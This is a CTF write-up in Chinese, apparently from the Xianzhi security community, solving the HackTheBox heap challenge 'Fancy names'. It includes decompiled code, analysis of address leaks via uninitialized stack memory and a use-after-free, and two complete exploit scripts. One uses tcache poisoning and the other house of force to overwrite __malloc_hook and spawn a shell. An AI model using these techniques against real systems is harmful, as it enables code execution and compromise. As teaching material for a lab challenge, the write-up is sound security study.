# 一次 house of force 练习：HTB pwn - Fancy names-先知社区

> **来源**: https://xz.aliyun.com/news/16262  
> **文章ID**: 16262

---

## 前言

HTB Challenge - Medium 难度的练习

一个堆题，难点在于如何泄露出地址，然后就是基本的tcache的打法，或者house of force的打法了，这里是一题多解

## 题目情况

```
Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'./.glibc/'
    Stripped:   No

```

## 逆向分析

main：

```
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  unsigned __int64 v4; // [rsp+0h] [rbp-130h]
  __int64 num; // [rsp+8h] [rbp-128h]
  __int64 size; // [rsp+10h] [rbp-120h]
  void *buf; // [rsp+18h] [rbp-118h]
  char username[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v9; // [rsp+128h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  v3 = time(0LL);
  srand(v3);
  memset(username, 0, 0x100uLL);
  create_random_username(username);
  fprintf(
    stdout,
    "\n%s[*] Welcome friend, your default username is: %s%s%s\n",
    "\x1B[1;34m",
    "\x1B[1;32m",
    username,
    "\x1B[1;34m");
  v4 = 0LL;
  menu(username);
  while ( v4 <= 3 )                             // 4次操作
  {
    fflush(stdout);
    fprintf(stdout, aChooseActionsL, ++v4);
    fflush(stdout);
    num = read_num();
    if ( num == 1 )
    {
      fwrite("\n[*] Stat points (max 120 per time): ", 1uLL, 0x25uLL, stdout);
      fflush(stdout);
      size = read_num();
      buf = malloc(size);                       // 任意大小申请
      if ( !buf )
      {
        fwrite("\n[-] Invalid points size! Exiting..\n", 1uLL, 0x24uLL, stdout);
        exit(1);
      }
      fwrite("\n[*] Stat (e.g. Health, Strength, Agility or Custom): ", 1uLL, 0x36uLL, stdout);
      fflush(stdout);
      read(0, buf, size + 8);                   // 8字节溢出，读取数据到内存
                                                // house of force?
      fprintf(stdout, "%s\n[+] Stat points added!\n%s\n", "\x1B[1;32m", "\x1B[1;34m");
      fflush(stdout);
    }
    else
    {
      if ( num != 2 )
        break;
      fprintf(stdout, aSStarterPackCo, "\x1B[1;32m", "\x1B[1;34m");
    }
  }
  exit(69);
}

```

这里首先调用了一个menu函数，然后进入菜单选项

这里的菜单选项只能使用4次，实际上只有1有用，2纯属浪费次数

1的效果是读取数字，然后申请内存，写入数据，这里写入可以溢出字节覆盖到下一个chunk的size字段

这里的读取数字：

```
unsigned __int64 read_num()
{
  __int8 buf[40]; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 canary; // [rsp+28h] [rbp-8h]

  canary = __readfsqword(0x28u);
  memset(buf, 0, 32);
  read(0, buf, 31uLL);
  return strtoul(buf, 0LL, 0);
}

```

意味着可以申请足够大的内存

这个menu函数反而又是一个菜单：

```
unsigned __int64 __fastcall menu(const char *a1)
{
  unsigned __int64 choose; // rax
  unsigned int v2; // eax
  unsigned int v3; // eax
  unsigned __int64 num; // rax
  int name_len; // [rsp+14h] [rbp-29Ch]
  unsigned __int64 op_count; // [rsp+18h] [rbp-298h]
  __int64 v8; // [rsp+20h] [rbp-290h]
  __int64 reroll_count; // [rsp+28h] [rbp-288h]
  char *mem1; // [rsp+38h] [rbp-278h]
  char *mem2_name; // [rsp+40h] [rbp-270h]
  char v12[3]; // [rsp+4Dh] [rbp-263h] BYREF
  char name1[96]; // [rsp+50h] [rbp-260h] BYREF
  int v14; // [rsp+B0h] [rbp-200h]
  char name2[96]; // [rsp+C0h] [rbp-1F0h] BYREF
  int v16; // [rsp+120h] [rbp-190h]
  char name3[96]; // [rsp+130h] [rbp-180h] BYREF
  int v18; // [rsp+190h] [rbp-120h]
  char buf[264]; // [rsp+1A0h] [rbp-110h] BYREF
  unsigned __int64 v20; // [rsp+2A8h] [rbp-8h]

  v20 = __readfsqword(0x28u);
  op_count = 0LL;
  v8 = 0LL;
  reroll_count = 0LL;
  memset(name1, 0, sizeof(name1));
  v14 = 0;
  memset(name2, 0, sizeof(name2));
  v16 = 0;
  memset(name3, 0, sizeof(name3));
  v18 = 0;
  mem1 = (char *)malloc(0x64uLL);
  strcpy(mem1, a1);
  mem2_name = (char *)malloc(0x64uLL);
  strcpy(mem2_name, a1);
  while ( op_count <= 1 )
  {
    fflush(stdout);
    fwrite(
      "\n[!] You can only change name twice! One custom and one suggested. Choose wisely!\n\n",
      1uLL,
      0x53uLL,
      stdout);
    fwrite("*********************\n", 1uLL, 0x16uLL, stdout);
    fwrite("*                   *\n", 1uLL, 0x16uLL, stdout);
    fwrite("*  [1] Custom name  *\n", 1uLL, 0x16uLL, stdout);
    fwrite("*  [2] Reroll name  *\n", 1uLL, 0x16uLL, stdout);
    fwrite("*  [3] Continue     *\n", 1uLL, 0x16uLL, stdout);
    fwrite("*  [4] Exit         *\n", 1uLL, 0x16uLL, stdout);
    fwrite("*                   *\n", 1uLL, 0x16uLL, stdout);
    fwrite("*********************\n\n> ", 1uLL, 0x19uLL, stdout);
    fflush(stdout);
    choose = read_num();
    switch ( choose )
    {
      case 2uLL:                                // reroll name
        if ( reroll_count == 1 )                // 1次机会
          goto LABEL_6;
        free(mem2_name);
        fprintf(
          stdout,
          "\n%s[!] Name has been deleted!\n[*] Generating suggested names..%s\n",
          "\x1B[1;32m",
          "\x1B[1;34m");
        create_random_username(name1);
        sleep(1u);
        v2 = time(0LL);
        srand(v2);
        create_random_username(name2);
        sleep(1u);
        v3 = time(0LL);
        srand(v3);
        create_random_username(name3);
        fflush(stdout);
        fprintf(stdout, "\n[*] Choose from suggested names:\n\n1. %s\n2. %s\n3. %s\n\n> ", name1, name2, name3);
        fflush(stdout);
        num = read_num();
        switch ( num )
        {
          case 2uLL:
            strcpy(mem2_name, name2);           // WAF
            goto LABEL_25;
          case 3uLL:
            strcpy(mem2_name, name3);
LABEL_25:
            ++op_count;
            reroll_count = 1LL;
            break;
          case 1uLL:
            strcpy(mem2_name, name1);
            goto LABEL_25;
          default:
            fprintf(stdout, "%s\n[-] Invalid option!\n%s", "\x1B[1;31m", "\x1B[1;34m");
            reroll_count = 1LL;
            break;
        }
        break;
      case 3uLL:                                // continue
        op_count = 10LL;                        // 设置op_count = 10
        break;
      case 1uLL:                                // custom name
        if ( v8 == 2 )
        {
LABEL_6:
          fprintf(stdout, "%s\n[-] Cannot change username again!\n%s", "\x1B[1;31m", "\x1B[1;34m");
        }
        else
        {
          if ( !v8 )                            // 为0时
          {
            free(mem1);                         // 第一次进来会释放mem1
            fflush(stdout);
            fprintf(stdout, "%s\n[+] Old name has been deleted!%s\n", "\x1B[1;32m", "\x1B[1;34m");
            fflush(stdout);
            v8 = 1LL;
          }
          fflush(stdout);
          fwrite("\n[*] Insert new name (minimum 5 chars): ", 1uLL, 0x28uLL, stdout);
          fflush(stdout);
          name_len = read(0, buf, 0x63uLL);
          fflush(stdout);
          fprintf(stdout, "\n[*] Are you sure you want to use the name %s\n(y/n): ", buf);
          fflush(stdout);
          read(0, v12, 2uLL);
          if ( v12[0] == 'y' )
          {
            if ( name_len > 5 )
            {
              v8 = 2LL;                         // 设置完成，变成2
              ++op_count;
              strcpy(mem2_name, buf);           // 复制到mem2
                                                // mem2可能是释放后的状态，最大99字节，不会溢出
              mem2_name[strlen(mem2_name) - 1] = 0;
              if ( !strcmp(mem2_name, "wisely") )
                fprintf(stdout, "\n%s[-.-] Very funny.. 10 points to Gryffindor!%s\n\n", "\x1B[1;31m", "\x1B[1;34m");
              else
                fprintf(stdout, "\n");
              fprintf(stdout, "\n[!] New name: %s%s%s\n", "\x1B[1;32m", mem2_name, "\x1B[1;34m");
              memset(buf, 0, 0x100uLL);
            }
            else
            {
              fprintf(stdout, "%s\n[-] Invalid name!\n%s", "\x1B[1;31m", "\x1B[1;34m");
              memset(buf, 0, name_len);
            }
          }
          else
          {
            memset(buf, 0, 0x100uLL);
            fprintf(stdout, "%s\n[*] Name has not been changed!\n%s", "\x1B[1;35m", "\x1B[1;34m");
          }
        }
        break;
      default:
        fwrite("\n[+] Goodbye!\n\n", 1uLL, 0xFuLL, stdout);
        exit(0);
    }
  }
  fprintf(stdout, "\n%s[+] Welcome %s!\n%s", "\x1B[1;32m", mem2_name, "\x1B[1;34m");
  fflush(stdout);
  return __readfsqword(0x28u) ^ v20;
}

```

申请了2个0x64的内存mem1和mem2，然后进入菜单项

1. 释放mem1，输入不超过0x63字节的内容到buf，buf是256字节栈缓冲区，确认后将内容复制到mem2，不进行确认则可再次选1
2. 释放mem2，随机生成3个字符串，选择一个填入mem2

## 利用分析

程序使用的 libc 是 2.27 版本，最初默认开启tcachebin的版本

这里的刚开始的menu提供了 UAF 写，可以写释放后的 tcache bin chunk，修改 next 指针

因为存在aslr和pie，所以没法修改成可利用的地址

### leak address

首先第一步就是要考虑完成地址泄露

整个程序中，会打印缓冲区的内容的地方：

```
name_len = read(0, buf, 0x63uLL);
          fflush(stdout);
          fprintf(stdout, "\n[*] Are you sure you want to use the name %s\n(y/n): ", buf);
          fflush(stdout);

```

这里的buf的定义：

```
char buf[264]; // [rsp+1A0h] [rbp-110h] BYREF

```

buf没有经过初始化，所以存在未初始化的内存，通过read写入数据，不会自动在末尾添加\x00

所以这里是潜在的泄露地址的地方，我在这里输入1111222\n，此时的栈：

```
34:01a0│-110   0x7ffd9848aa40 ◂— '1111222\n'
35:01a8│-108   0x7ffd9848aa48 ◂— 0x0
36:01b0│-100   0x7ffd9848aa50 —▸ 0x562c822015e0 (_start) ◂— xor ebp, ebp
37:01b8│-0f8   0x7ffd9848aa58 —▸ 0x7ffd9848ad70 ◂— 0x1
38:01c0│-0f0   0x7ffd9848aa60 ◂— 0x0
39:01c8│-0e8   0x7ffd9848aa68 ◂— 0x0
3a:01d0│-0e0   0x7ffd9848aa70 —▸ 0x7ffd9848ac90 —▸ 0x562c822023a0 (__libc_csu_init) ◂— push r15
3b:01d8│-0d8   0x7ffd9848aa78 —▸ 0x7f85696f8f44 (fprintf+148) ◂— mov rcx, qword ptr [rsp + 0x18]
3c:01e0│-0d0   0x7ffd9848aa80 ◂— 0x3000000030 /* '0' */
3d:01e8│-0c8   0x7ffd9848aa88 —▸ 0x7ffd9848ab60 ◂— 0x0
3e:01f0│-0c0   0x7ffd9848aa90 —▸ 0x7ffd9848aaa0 ◂— 0x0
3f:01f8│-0b8   0x7ffd9848aa98 ◂— 0x166a38f9e4255800
40:0200│-0b0   0x7ffd9848aaa0 ◂— 0x0
41:0208│-0a8   0x7ffd9848aaa8 ◂— 0x0

```

这里有 stack 地址和 pie 地址和 libc 地址

因为机会只有一次，这次打印完buf的内容之后，无论如何都会清空buf，所以还是泄露 libc 地址更有用

另一个泄露地址的地方在menu函数的结尾：

```
fprintf(stdout, "\n%s[+] Welcome %s!\n%s", "\x1B[1;32m", mem2_name, "\x1B[1;34m");

```

会在退出menu函数的时候打印mem2的内容

### 非预期解：tcachebin dup to drop shell

泄露 libc 地址：

```
sla(b"> ",b"1")
sa(b": ",cyclic(56))
ru(cyclic(56))
leak = rl()[:-1]
leak = unpack(leak,"all")
success(f"leak: {hex(leak)}")
libc.address = leak - 0x64f44
success(f"libc.address: {hex(libc.address)}")

```

先使用1选项释放mem1，通过未初始化的内存，得到libc地址之后，输入n，可再次使用1选项

然后使用2选项释放了mem2，此时的内存如下：上面的是mem1，下面的是mem2

```
0x55e907025250  0x0000000000000000      0x0000000000000071      ........q.......
0x55e907025260  0x0000000000000000      0x000055e907025010      .........P...U..
0x55e907025270  0x0000000000000000      0x0000000000000000      ................
0x55e907025280  0x0000000000000000      0x0000000000000000      ................
0x55e907025290  0x0000000000000000      0x0000000000000000      ................
0x55e9070252a0  0x0000000000000000      0x0000000000000000      ................
0x55e9070252b0  0x0000000000000000      0x0000000000000000      ................
0x55e9070252c0  0x0000000000000000      0x0000000000000071      ........q.......
0x55e9070252d0  0x42746e6167656c45      0x0000003737316565      ElegantBee177...         <-- tcachebins[0x70][0/2]
0x55e9070252e0  0x0000000000000000      0x0000000000000000      ................
0x55e9070252f0  0x0000000000000000      0x0000000000000000      ................
0x55e907025300  0x0000000000000000      0x0000000000000000      ................
0x55e907025310  0x0000000000000000      0x0000000000000000      ................
0x55e907025320  0x0000000000000000      0x0000000000000000      ................
0x55e907025330  0x0000000000000000      0x0000000000020cd1      ................         <-- Top chunk

```

后释放的进入tcachebin的顶端，控制其next指针，即可控制后续的分配

接下来再使用选项1修改其为malloc hook地址：

```
0x55e907025250  0x0000000000000000      0x0000000000000071      ........q.......
0x55e907025260  0x0000000000000000      0x000055e907025010      .........P...U..
0x55e907025270  0x0000000000000000      0x0000000000000000      ................
0x55e907025280  0x0000000000000000      0x0000000000000000      ................
0x55e907025290  0x0000000000000000      0x0000000000000000      ................
0x55e9070252a0  0x0000000000000000      0x0000000000000000      ................
0x55e9070252b0  0x0000000000000000      0x0000000000000000      ................
0x55e9070252c0  0x0000000000000000      0x0000000000000071      ........q.......
0x55e9070252d0  0x00007fa762243c30      0x0000003737316565      0<$b....ee177...         <-- tcachebins[0x70][0/2]
0x55e9070252e0  0x0000000000000000      0x0000000000000000      ................
0x55e9070252f0  0x0000000000000000      0x0000000000000000      ................
0x55e907025300  0x0000000000000000      0x0000000000000000      ................
0x55e907025310  0x0000000000000000      0x0000000000000000      ................
0x55e907025320  0x0000000000000000      0x0000000000000000      ................
0x55e907025330  0x0000000000000000      0x0000000000020cd1      ................         <-- Top chunk

pwndbg> x/a 0x00007fa762243c30
0x7fa762243c30 <__malloc_hook>: 0x0

```

接下来要做的就是，先申请一个无关紧要的 0x70 的 chunk，然后再次申请就能把malloc hook地址给申请走，写入system函数即可

在下次申请内存的时候，输入sh字符串的地址即可拿到shell

#### 完整exp

```
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

sla(b"> ",b"1")
sa(b": ",cyclic(56))
ru(cyclic(56))
leak = rl()[:-1]
leak = unpack(leak,"all")
success(f"leak: {hex(leak)}")
libc.address = leak - 0x64f44
success(f"libc.address: {hex(libc.address)}")

sla(b": ",b"n")
sla(b"> ",b"2")
sla(b"> ",b"2")

sla(b"> ",b"1")
sa(b": ",pack(libc.sym.__malloc_hook)[:6]+b"\x0a")
sla(b": ",b"y")

sla(b"> ",b"1")
sla(b": ",b"99")
sla(b": ",b"123")

sla(b"> ",b"1")
sla(b": ",b"99")
sla(b": ",pack(libc.sym.system))

sla(b"> ",b"1")
sla(b": ",str(next(libc.search(b"/bin/sh"))).encode())

ia()

```

### 预期解：house of force

泄露libc和heap：

```
sla(b"> ",b"1")
sa(b": ",cyclic(56))
ru(cyclic(56))
leak = rl()[:-1]
leak = unpack(leak,"all")
success(f"leak: {hex(leak)}")
libc.address = leak - 0x64f44
success(f"libc.address: {hex(libc.address)}")

sla(b": ",b"n")
sla(b"> ",b"2")
sla(b"> ",b"22")

sla(b"> ",b"3")
ru(b"Welcome ")
leak2 = rl()[:-2]
leak2 = unpack(leak2,"all")
success(f"leak2: {hex(leak2)}")
heapbase = leak2 - 0x260
success(f"heapbase: {hex(heapbase)}")

```

通过menu的菜单选项2，把mem2给释放了，然后输入错误的选项，不进行填充内容

通过选项3的continue直接退出循环，在menu的结尾就会打印mem2的内容，正好是tcachebin chunk 的next指针，指向另一个tcachebin chunk的地址，就是堆地址

拿到heap，libc地址泄露，main函数的菜单提供了8字节溢出，libc版本是2.27，申请大小无限制

正好满足了house of force的条件（2.29被修补，2.29前可用）

那么要做的就是：申请随便一个内存，修改top chunk size为足够大的数

```
sla(b"> ",b"1")
sla(b": ",b"24")
sa(b": ",cyclic(24) + pack(0xfffffff20c08))

```

然后申请足够大的内存，让top chunk位于malloc hook附近：

```
size = libc.sym.__malloc_hook - 0x20 - heapbase - 0x350
sla(b"> ",b"1")
sla(b": ",str(size).encode())
sla(b": ",pack(0xdeadbeef))

```

此时的top chunk：

```
pwndbg> top_chunk
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

PREV_INUSE
Addr: 0x7fd31a7eec20
Size: 0xd585991e2338 (with flag bits: 0xd585991e2339)

pwndbg> x/20xga 0x7fd31a7eec20
0x7fd31a7eec20 <__memalign_hook>:       0x7fd31a49a4f0  0xd585991e2339
0x7fd31a7eec30 <__malloc_hook>: 0x0     0x0

```

下一次申请就可以操纵malloc hook了，然后控制之后修改为system，申请一个指向sh字符串指针大小的内存即可拿到shell

#### 完整exp

```
#!/usr/bin/env python3
from pwncli import *
cli_script()

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


sla(b"> ",b"1")
sa(b": ",cyclic(56))
ru(cyclic(56))
leak = rl()[:-1]
leak = unpack(leak,"all")
success(f"leak: {hex(leak)}")
libc.address = leak - 0x64f44
success(f"libc.address: {hex(libc.address)}")

sla(b": ",b"n")
sla(b"> ",b"2")
sla(b"> ",b"22")

sla(b"> ",b"3")
ru(b"Welcome ")
leak2 = rl()[:-2]
leak2 = unpack(leak2,"all")
success(f"leak2: {hex(leak2)}")
heapbase = leak2 - 0x260
success(f"heapbase: {hex(heapbase)}")

# overwrite top chunk size field
sla(b"> ",b"1")
sla(b": ",b"24")
sa(b": ",cyclic(24) + pack(0xfffffff20c08))

size = libc.sym.__malloc_hook - 0x20 - heapbase - 0x350
sla(b"> ",b"1")
sla(b": ",str(size).encode())
sla(b": ",pack(0xdeadbeef))

sla(b"> ",b"1")
sla(b": ",b"24")
sla(b": ",pack(libc.sym.system))

sla(b"> ",b"1")
sla(b": ",str(next(libc.search(b"/bin/sh"))).encode())

ia()

```

## 总结

做完一看flag，竟然是house of force，原来我这是非预期解啊

要实施house of force需要的条件是libc泄露，heap泄露，能覆盖top chunk size，这里的heap泄露要如何拿到？后来才发现还有个地方能泄露地址（挠头）

## 参考资料

* [Hack The Box :: Hack The Box](https://app.hackthebox.com/challenges/fancy-names)
